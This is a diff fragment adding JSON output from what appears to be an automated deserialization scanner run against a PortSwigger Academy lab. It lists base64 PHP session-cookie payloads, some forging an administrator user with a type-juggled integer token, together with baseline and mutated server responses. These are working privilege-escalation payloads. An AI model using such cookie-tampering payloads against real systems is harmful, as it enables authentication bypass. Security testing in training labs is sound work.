+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserializ",
+            "length": 2469,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkOW42YzV6d3gxa3VmOGV1bHJkcW4yYnppMGRxbzgwdyI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10733 mutated=2723"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserializ",
+            "length": 2723,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10733 mutated=2715"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserializ",
+            "length": 2715,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10733 mutated=2714"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserializ",
+            "length": 2714,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10733 mutated=2719"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserializ",
+            "length": 2719,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": "access_token->i:0",
+          "indicators": [
+            "Observation: response length changed by +69 bytes (baseline=10733 mutated=10802, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=1.00) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsEcommerce.css rel=stylesh' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsEcommerce.css rel=stylesh')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10802,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "payload_type": "type_juggle"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": "username=administrator + access_token=i:0",
+          "indicators": [
+            "Observation: response length changed by +76 bytes (baseline=10733 mutated=10809, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=1.00) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsEcommerce.css rel=stylesh' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsEcommerce.css rel=stylesh')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10809,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "payload_type": "type_juggle_privesc"
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500",
+        "Response length changed significantly: baseline=10733 mutated=2749"
+      ],
+      "likely_vulnerable": true,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 10,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"d9n6c5zwx1kuf8eulrdqn2bzi0dqo80w\";}"
+      ],
+      "notes": "String field detected — try changing role/privilege value",
+      "severity": "Medium",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "modify_string",
+      "type": "PHP",
+      "url": "https://0a7b00d30427702480d15db7009f0032.web-security-academy.net/"
+    }
+  ],
+  "stats": {
+    "after_filter": 5,
+    "findings": 5,
+    "likely_vulnerable": 5,
+    "vectors_scanned": 143
+  },
+  "target": "0a7b00d30427702480d15db7009f0032.web-security-academy.net"
+}
